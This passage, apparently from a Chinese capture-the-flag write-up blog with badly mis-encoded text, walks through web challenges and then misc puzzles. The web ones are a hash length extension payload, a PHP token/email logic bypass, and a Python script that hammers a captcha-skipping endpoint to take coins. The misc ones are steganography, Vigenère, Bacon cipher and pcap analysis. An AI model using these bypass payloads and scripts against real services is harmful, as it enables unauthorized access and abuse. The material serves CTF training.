c70ab9d039f166c5b5f506a5698ebaa1</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">37d0fe2c401a689be9608e9f850ef3de</span><br><span class="line">guest\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure></p><p>å‘åŒ…å³å¯å¾—åˆ°flag<br><a href="https://imgchr.com/i/i8p0pT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8p0pT.md.png" alt="i8p0pT.md.png"></a></p><p>å¯ä»¥çœ‹ä¸€ä¸‹æˆ‘ä»¥å‰çš„<a href="https://0verwatch.top/hash-length-attack.html">æ–‡ç« </a></p><h4 id="logic"><a href="#logic" class="headerlink" title="logic"></a>logic</h4><p>è¿™ä¸ªé¢˜ç›®ä¸ªäººæ„Ÿè§‰æœ‰è„‘æ´ï¼Œè¿™ä¸ªé¢˜ç›®ä¸€ä¸Šæ¥æŠ“åŒ…å•¥çš„éƒ½æ²¡æœ‰ä»€ä¹ˆæç¤ºï¼Œå°±è¿é¢˜ç›®éœ€è¦çš„tokenä¹Ÿæ²¡æ‰¾ç€ï¼Œç„¶ååœ¨æŸ¥çœ‹æºä»£ç çš„æ—¶å€™æ‰ç”¨è„‘æ´å‘ç°çš„ä¿¡æ¯<br><a href="https://imgchr.com/i/i8pat0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8pat0.md.png" alt="i8pat0.md.png"></a><br>è¿™é‡Œçš„<code>meta</code>çš„ä¿¡æ¯åœ¨å¯¹è§£é¢˜èµ·äº†å…³é”®çš„ä½œç”¨ï¼Œå‘ç°æ˜¯<code>vim</code>ç¼–è¾‘å™¨ç¼–è¾‘çš„ï¼Œéš¾ä¹ˆå¯èƒ½å°±æœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•ä¸€ä¸‹ä¸Šä¸€é¢˜çš„<code>swp</code>æ–‡ä»¶ï¼Œæœç„¶æœ‰ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å¦‚æœç™»å½•é‚®ç®±åœ°å€ä¸æ˜¯ç®¡ç†å‘˜åˆ™ die()</span></span><br><span class="line"><span class="comment">æ•°æ®åº“ç»“æ„</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- è¡¨çš„ç»“æ„ `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- è½¬å­˜è¡¨ä¸­çš„æ•°æ® `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****ä¸å¯è§***', '***ä¸å¯è§***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"å¤±è´¥äº†å‘€"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å…³é”®ç»•è¿‡çš„ä»£ç æ˜¯è¿™ä¸€éƒ¨åˆ†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬äº†éœ€è¦æ„é€ tokenç­‰äº0å¹¶ä¸”é•¿åº¦ç­‰äº10ï¼Œè€Œä¸”è¿˜è¦çŸ¥é“adminçš„é‚®ç®±</p><p>è¿™åˆéœ€è¦è„‘æ´äº†ï¼Œæˆ‘ä»¬åˆå¯ä»¥ä»metaä¿¡æ¯é‡Œé¢å¾—åˆ°adminæ˜¯<code>chenyurui</code>ï¼Œé‚®ç®±æ˜¯<code>gmail</code>ï¼Œè‡ªå·±å¤Ÿæ—©ä¸€æ³¢é‚®ç®±åœ°å€ å°±æ˜¯<a href="mailto:`chenyurui@gmail.com" target="_blank" rel="noopener">`chenyurui@gmail.com</a><code>ï¼Œç„¶åtokenè¾“å…¥</code>0000000000`å°±å¯ä»¥å¾—åˆ°flagäº†</p><h4 id="æ·˜é‡‘"><a href="#æ·˜é‡‘" class="headerlink" title="æ·˜é‡‘"></a>æ·˜é‡‘</h4><p>è¿™ä¸ªé¢˜åœ¨æŠ¢é’±çš„æ—¶å€™å°±ä¼šè¾“å‡ºä¸€ä¸ªéªŒè¯ç è®©ä½ è¾“å…¥ï¼Œåœ¨5ç§’ä¹‹å†…å¦‚æœæ²¡è¾“å…¥æ­£ç¡®çš„éªŒè¯ç å°±ä¸èƒ½æŠ¢ï¼Œå¦‚æœè¾“å…¥æ­£ç¡®çš„è¯å°±ä¼šè®¿é—®ä¸€ä¸ª<code>dorob.php</code>çš„é¡µé¢ï¼Œæˆ‘ä»¬ç°åœ¨çš„æ–¹æ³•å°±ç›¸å½“äºç›´æ¥è·³è¿‡éªŒè¯ç æ£€éªŒçš„è¿™ä¸€æ­¥ç›´æ¥è®¿é—®è¿™ä¸ªé¡µé¢å°±ä¼šç›´æ¥è¾¾åˆ°æŠ¢åŠ«çš„ç›®çš„ï¼Œä½†æ˜¯ä¸€å®šå¾—åœ¨5ç§’ä»¥å†…ï¼Œä¸ç„¶æ˜¯æŠ¢ä¸åˆ°çš„ï¼Œè¿™å°±ç›¸å½“äºç¼–å†™ä»£ç çš„äººæ²¡å¯¹éªŒè¯ç è¿›è¡Œä¸¥æ ¼çš„é™åˆ¶ä»è€Œå¯¼è‡´é€»è¾‘é”™è¯¯ã€‚ã€‚<br>è¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬å¯ä»¥ä¸æ–­å¯¹é‚£ä¸ªé¡µé¢å‘åŒ…ï¼Œç„¶åæŠ¢åŠ«æŸä¸€ä¸ªäººçš„é‡‘å¸å³å¯ï¼Œå°±ä¼šå‘ç°å¾ˆæ˜æ˜¾å›æ˜¾å¼‚æ ·<br><a href="https://imgchr.com/i/i8Q5nA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8Q5nA.md.png" alt="i8Q5nA.md.png"></a></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹å³å¯ï¼Œå†™äº†ä¸ªè„šæœ¬ï¼Œå°±ä»å‰é¢ä¸‰ä¸ªæœ€æœ‰é’±çš„äººé‡Œé¢æŠ¢å§<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=109'</span></span><br><span class="line">url_rob = <span class="string">'http://202.119.201.199/challenge/web/robber/dorob.php'</span></span><br><span class="line">url2 = <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=103'</span></span><br><span class="line">url3 = <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=58'</span></span><br><span class="line"></span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=109'</span>,</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'202.119.201.199'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0'</span>,</span><br><span class="line">     <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">     <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:<span class="string">'kupr8ubqffdcpsstn21mp6bhv0'</span>, </span><br><span class="line"><span class="string">'ssid'</span>:<span class="string">'ef260780a098d5fcb1185bca69db366d'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'EddieIvan'</span>,</span><br><span class="line"><span class="string">'num'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">data2 =&#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'altman'</span>,</span><br><span class="line"><span class="string">'num'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">data3 = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'å°æ˜'</span>,</span><br><span class="line"><span class="string">'num'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">ans1 = requests.get(url,cookies=cookies)</span><br><span class="line">ans2 = requests.post(url_rob,data=data,cookies=cookies,headers=headers)</span><br><span class="line">ans1 = requests.get(url2,cookies=cookies)</span><br><span class="line">ans2 = requests.post(url_rob,data=data2,cookies=cookies,headers=headers)</span><br><span class="line">ans1 = requests.get(url3,cookies=cookies)</span><br><span class="line">ans2 = requests.post(url_rob,data=data3,cookies=cookies,headers=headers)</span><br><span class="line">time.sleep(<span class="number">4.7</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Waiting'</span></span><br></pre></td></tr></table></figure></p><p>å½“ä½ çš„é‡‘å¸é«˜äº1000çš„æ—¶å€™å°±å¯ä»¥ç‚¹å‡»è´­ä¹°flagçš„é‚£ä¸ªé¡µé¢å°±å¯ä»¥äº†å¾—åˆ°flagäº†</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h4><p>è¿™ä¸ªé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯å¯¹LSBè¿™ä¸ªä¸œè¥¿çš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚æˆ‘ä»¬ç”¨ç¥å™¨StegSolveæ¥çœ‹ä¸€ä¸‹é‡Œé¢ç©¶ç«Ÿæœ€ä½ä½é‡Œé¢è—äº†ä»€ä¹ˆä¸œè¥¿<br>å¯ä»¥çœ‹åˆ°åœ¨æœ€ä½ä½çš„é‚£ä¸€éƒ¨åˆ†å‘ç°äº†ä¸€å¼ å›¾ç‰‡ä¿å­˜å‘ç°æ˜¯ä¸€å¼ äºŒç»´ç <br><a href="https://imgchr.com/i/ilHS6f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHS6f.md.jpg" alt="ilHS6f.md.jpg"></a><br>æ‰«ä¸€æ‰«å°±å¯ä»¥å¾—åˆ°flagäº†<br><img src="https://s1.ax1x.com/2018/09/30/ilHpX8.jpg" alt="ilHpX8.jpg"></p><h4 id="çˆ±å› æ–¯å¦"><a href="#çˆ±å› æ–¯å¦" class="headerlink" title="çˆ±å› æ–¯å¦"></a>çˆ±å› æ–¯å¦</h4><p>åœ¨å±æ€§é‡Œé¢å‘ç°äº†è¿™æ ·çš„ä¸€å¥è¯<br><img src="https://s1.ax1x.com/2018/09/30/ilHCnS.jpg" alt="ilHCnS.jpg"><br>ä¸ç®¡å…ˆæœ‰æ²¡æœ‰ç”¨å…ˆè®°å½•ä¸€ä¸‹<br>ç„¶åå»kalié‡Œé¢æŠŠè¿™ä¸ªå›¾ç‰‡binwalkä¸€ä¸‹å‘ç°é‡Œé¢å­˜åœ¨ä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒæŠŠä»–åˆ†ç¦»å‡ºæ¥<br><a href="https://imgchr.com/i/ilHi7Q" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHi7Q.md.jpg" alt="ilHi7Q.md.jpg"></a></p><p>ç„¶åæ‰“å¼€é‡Œé¢çš„å‹ç¼©åŒ…ï¼Œå‘ç°åŠ å¯†äº†ï¼Œè¿™æ­£å¥½æƒ³èµ·åˆšæ‰çš„é‚£ä¸€ä¸²æ–‡å­—ï¼Œç„¶åè¾“å…¥è¿›å»å‘ç°å¯ä»¥è§£å¼€å¹¶å¾—åˆ°flag<br><a href="https://imgchr.com/i/ilHkkj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHkkj.md.jpg" alt="ilHkkj.md.jpg"></a></p><h4 id="è§†è€Œä¸è§"><a href="#è§†è€Œä¸è§" class="headerlink" title="è§†è€Œä¸è§"></a>è§†è€Œä¸è§</h4><p>è¿™ä¸ªé¢˜ç›®ä¹Ÿæ˜¯åº”ç”¨äº†StegSolveè¿™ä¸ªå·¥å…·ï¼Œå› ä¸ºä¸€å¼€å§‹å‘ç°è¿™å¼ å›¾ç‰‡å¥½åƒæ˜¯è¢«æ‹‰ä¼¸äº†ä¸€æ ·ï¼Œæ‰€ä»¥æœæ–­æ”¾è¿›å»<br>åˆ©ç”¨é‡Œé¢çš„stereogram Solveråœ¨åç§»é‡ä¸º104çš„æ—¶å€™å°±å‡ºç°flagäº†<br><a href="https://imgchr.com/i/ilHEhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHEhn.md.jpg" alt="ilHEhn.md.jpg"></a></p><h4 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy crypto"></a>easy crypto</h4><p>è¿™ä¸ªé¢˜ç›®æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå…ˆæŠŠå…¶ä¸­çš„æ‘©æ–¯å¯†ç ç»™è§£å¯†å¾—åˆ°å¦ä¸€ä¸²å­—ç¬¦ä¸²<br><code>keyisvigenerecipher</code><br>è¿™å°±ç›¸å½“äºç»™äº†æˆ‘ä»¬æç¤ºç»´å‰å°¼äºšå¯†ç <br>ç„¶åæˆ‘ä»¬å°±å»åœ¨çº¿ç½‘é¡µä¸Šè§£ç ï¼Œè€Œä¸”ç»™å‡ºäº†keyæ˜¯<code>vigenerecipher</code>ç„¶åæˆ‘ä»¬ç”¨é‚£ä¸€ä¸²å¯†æ–‡å°è¯•è§£å¯†å¾—åˆ°flag<br><a href="https://imgchr.com/i/ilHZpq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHZpq.md.jpg" alt="ilHZpq.md.jpg"></a></p><h4 id="æˆ‘å°±æƒ³è¯•è¯•è¿™ä¸ªåå­—åˆ°åº•èƒ½å¤Ÿèµ·å¤šé•¿"><a href="#æˆ‘å°±æƒ³è¯•è¯•è¿™ä¸ªåå­—åˆ°åº•èƒ½å¤Ÿèµ·å¤šé•¿" class="headerlink" title="æˆ‘å°±æƒ³è¯•è¯•è¿™ä¸ªåå­—åˆ°åº•èƒ½å¤Ÿèµ·å¤šé•¿"></a>æˆ‘å°±æƒ³è¯•è¯•è¿™ä¸ªåå­—åˆ°åº•èƒ½å¤Ÿèµ·å¤šé•¿</h4><p>è¿™ä¸ªé¢˜ç›®ä¹Ÿè¦ç”¨åˆ°StegSolveï¼Œæ¯•ç«Ÿè¿™ä¸œè¥¿åœ¨å›¾ç‰‡éšå†™é‡Œé¢ç»å¸¸ä½¿ç”¨<br>è·Ÿä¸Šé¢æœ‰ä¸€é¢˜å¾ˆç±»ä¼¼çš„æ“ä½œä¹Ÿæ˜¯å»çœ‹çœ‹æœ€ä½ä½éšè—äº†ä»€ä¹ˆä¿¡æ¯<br>ç„¶åå¯ä»¥å‘å–œé‚£é‡Œé¢æ”¾äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¿å­˜ä¸‹æ¥æ‰“å¼€å°±å¥½<br><a href="https://imgchr.com/i/ilHe10" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHe10.md.jpg" alt="ilHe10.md.jpg"></a><br>åœ¨kalié‡Œé¢æ‰“å¼€å¹¶ä½¿ç”¨stringså‘½ä»¤æŸ¥çœ‹æœ‰å“ªäº›å¯è§å­—ç¬¦ï¼Œå‘ç°flag<br><img src="https://s1.ax1x.com/2018/09/30/ilHnXT.jpg" alt="ilHnXT.jpg"></p><h4 id="ä½ çš„çŸ³é”…æ‹Œé¥­"><a href="#ä½ çš„çŸ³é”…æ‹Œé¥­" class="headerlink" title="ä½ çš„çŸ³é”…æ‹Œé¥­"></a>ä½ çš„çŸ³é”…æ‹Œé¥­</h4><p>è¿™ä¸€ä¸ªé¢˜ç›®åè„‘æ´ï¼Œå› ä¸ºé¢˜ç›®è¯´äº†æœ‰åŸ¹æ ¹è¿™ä¸œè¥¿ï¼Œä»è€Œå¯ä»¥è”æƒ³åˆ°åŸ¹æ ¹å¯†ç ï¼Œè¿™é‡Œé¢çš„æ­£ä½“ä»£è¡¨çš„æ˜¯Aï¼Œæ–œä½“ä»£è¡¨çš„æ˜¯Bï¼Œä»¥æ­¤æ¨å‡ºå¯†æ–‡ä¸ºä¸‹é¢çš„ä¸€ä¸²ä¸œè¥¿ï¼Œ<code>ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB</code><br>å› ä¸ºé¢˜ç›®è¯´äº†å¯†æ–‡æ˜¯å¤§å†™ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬å…¨éƒ½æ˜¯å¤§å†™ï¼Œç„¶ååœ¨çº¿è§£å¯†å°±å¯ä»¥å¾—åˆ°flagäº†<br><img src="https://s1.ax1x.com/2018/09/30/ilHKnU.jpg" alt="ilHKnU.jpg"></p><h4 id="é²¨é±¼çš„å¥—è·¯"><a href="#é²¨é±¼çš„å¥—è·¯" class="headerlink" title="é²¨é±¼çš„å¥—è·¯"></a>é²¨é±¼çš„å¥—è·¯</h4><p> è¿™ä¸ªé¢˜ç›®ä¸€æ‰“å¼€åè®®åˆ†æé‡Œé¢å‘ç°tcpæµé‡ç‰¹åˆ«å¤š<br><a href="https://imgchr.com/i/ilHMBF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHMBF.md.png" alt="ilHMBF.md.png"></a></p><p>è¿‡æ»¤tcpæµé‡çœ‹ä¸€ä¸‹ï¼Œç„¶åè¿½è¸ªtcpæµçœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€æ®µbase64è§£ç å‘ç°å­˜åœ¨pkå¤´ï¼Œå¯¼å‡ºæ¥å¦å­˜ä¸ºå‹ç¼©åŒ…<br><a href="https://imgchr.com/i/ilH1AJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilH1AJ.md.png" alt="ilH1AJ.md.png"></a></p><p><a href="https://imgchr.com/i/ilHJ91" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHJ91.md.png" alt="ilHJ91.md.png"></a><br>ç„¶åå‘ç°å‹ç¼©åŒ…æœ‰åŠ å¯†<br>äºæ˜¯æ‰“å¼€çœ‹ä¸€ä¸‹æ˜¯å¦æ˜¯ä¼ªåŠ å¯†ï¼Œå½“ç„¶è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªå‹ç¼©åŒ…æ–‡ä»¶é‡Œé¢çœ‹åˆ°çš„æ–‡ä»¶åçš„æç¤ºï¼Œä»16è¿›ç¼–è¾‘å™¨ä¸­çœ‹åˆ°å¾ˆæ˜æ˜¾å…¨å±€æ²¡æœ‰åŠ å¯†ï¼Œè¯´æ˜è‚¯å®šæ˜¯ä¼ªåŠ å¯†ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠ09æ”¹ä¸º00å³å¯<br><a href="https://imgchr.com/i/ilHcgP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHcgP.md.png" alt="ilHcgP.md.png"></a></p><p>å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/09/30/ilHNjK.png" alt="ilHNjK.png"></p><h4 id="èŒèŒå“’"><a href="#èŒèŒå“’" class="headerlink" title="èŒèŒå“’"></a>èŒèŒå“’</h4><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯è€ƒå¯Ÿå‡ ç§ä¸åŒçš„ç¼–ç æ–¹å¼è€Œå·²<br>é¦–å…ˆæ˜¯jsæ··æ·†ï¼Œæˆ‘ä»¬ç›´æ¥æ”¾è¿›æ§åˆ¶å°è·‘ä¸€ä¸‹å°±å‘ç°å¦å¤–çš„ä¸€ä¸ªæ–‡ä»¶<br><a href="https://imgchr.com/i/ilHBAH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHBAH.png" alt="ilHBAH.png"></a><br>ç„¶åè¿›å»ä¹‹åå‘ç°æ˜¯ä¸€å †brainfuckç¼–ç <br>å»è¿™ä¸ªç½‘ç«™è§£ç ä¸€ä¸‹<br><a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>å¾—åˆ°å¦å¤–çš„ä¸€ä¸ªç»è¿‡Ookç¼–ç çš„çš„ä¸œè¥¿ï¼Œå†è§£ç ä¸€ä¸‹<br><a href="https://imgchr.com/i/ilHr4A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHr4A.md.png" alt="ilHr4A.md.png"></a><br>å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/09/30/ilH63t.png" alt="ilH63t.png"></p><h4 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h4><p>åŒæ ·çš„æ“ä½œç”¨wiresharkå…ˆåˆ†æä¸€ä¸‹åè®®ï¼Œå‘ç°ftpåè®®ç‰¹åˆ«å¤šï¼Œç„¶åè¿½è¸ªä¸€æ³¢ftp<br><a href="https://imgchr.com/i/ilHRu8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHRu8.md.png" alt="ilHRu8.md.png"></a></p><p>ç„¶åå†è¿½è¸ªtcpæµå‘ç°è¿™é‡Œé¢æ˜¯åˆ©ç”¨userè´¦æˆ·ç™»å½•ftpå¹¶ä¸”å¯†ç æ˜¯<br><img src="https://s1.ax1x.com/2018/09/30/ilH4EQ.png" alt="ilH4EQ.png"><br>è€Œä¸”è¿˜åœ¨ä¸‹é¢å‘ç°ä»–ä¸‹è½½äº†ä¸€ä¸ªflagçš„å‹ç¼©åŒ…ï¼Œç„¶åæˆ‘ä»¬å†è¿‡æ»¤ä¸€ä¸‹ftp-dataï¼ŒæŠŠæ•°æ®æµç»™ä¿å­˜èµ·æ¥ï¼Œåˆå‘ç°è¿™ä¸ªå‹ç¼©åŒ…æ˜¯åŠ å¯†çš„ï¼Œè¿™æ¬¡å‘ç°è¿™ä¸ªå‹ç¼©åŒ…ä¸æ˜¯ä¼ªåŠ å¯†äº†ï¼Œå› ä¸ºå…¨å±€åŠ å¯†ä½æ˜¯å¥‡æ•°ï¼Œæ‰€ä»¥æ˜¯è‚¯å®šæ˜¯éœ€è¦å¯†ç çš„<br><img src="https://s1.ax1x.com/2018/09/30/ilbe5d.jpg" alt="ilbe5d.jpg"></p><p>å°è¯•åœ¨åŒ…é‡Œé¢æœç´¢å…³é”®å­—passwordæ²¡æ‰¾åˆ°ï¼Œåªèƒ½å°è¯•ftpç™»å½•å¯†ç ï¼Œæœç„¶æŠŠæ–‡ä»¶ç»™è§£å‹å‡ºäº†ï¼Œä½†æ˜¯æ”¾åœ¨HXDä¸­æŸ¥çœ‹æœ‰ç‚¹å¼‚å¸¸å› ä¸ºé‡Œé¢å­˜åœ¨IDHRè¿™æ ·çš„ä¸œè¥¿ï¼Œæ˜æ˜¾æ˜¯pngå›¾ç‰‡çš„å†…å®¹ï¼Œæ–‡ä»¶å´æ²¡æœ‰pngæ–‡ä»¶çš„å¤´éƒ¨ï¼Œæ‰¾ä¸ªpngæ–‡ä»¶å¯¹æ¯”ä¸€ä¸‹ï¼Œå‘ç°å¤´éƒ¨æœç„¶è¢«ä¿®æ”¹<br>æ­£å¸¸æ˜¯è¿™æ ·çš„<br><img src="https://s1.ax1x.com/2018/09/30/ilHbvV.png" alt="ilHbvV.png"><br>ä½†ç°åœ¨æ˜¯è¿™æ ·çš„<br><img src="https://s1.ax1x.com/2018/09/30/ilHLuT.png" alt="ilHLuT.png"><br>åªéœ€è¦ä¿®æ”¹å‡ ä½å³å¯ï¼Œæœ€åå¾—å¼€å›¾ç‰‡æ–‡ä»¶è·å¾—flag<br><a href="https://imgchr.com/i/ilHXbF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHXbF.md.png" alt="ilHXbF.md.png"></a></p><h4 id="å­¦å§çœŸç¾"><a href="#å­¦å§çœŸç¾" class="headerlink" title="å­¦å§çœŸç¾"></a>å­¦å§çœŸç¾</h4><p>æ ¹æ®æç¤ºå‘ç°åº”è¯¥æ˜¯åœ¨å›¾ç‰‡é‡Œé¢åšäº†æ‰‹è„š<br>ç”¨HXDæ‰“å¼€ä¸€ä¸‹ï¼Œå‘ç°æ–‡ä»¶å¤´éƒ¨è¿˜åœ¨ï¼Œä½†æ˜¯å‘ç°åé¢ä¸€å¤§å 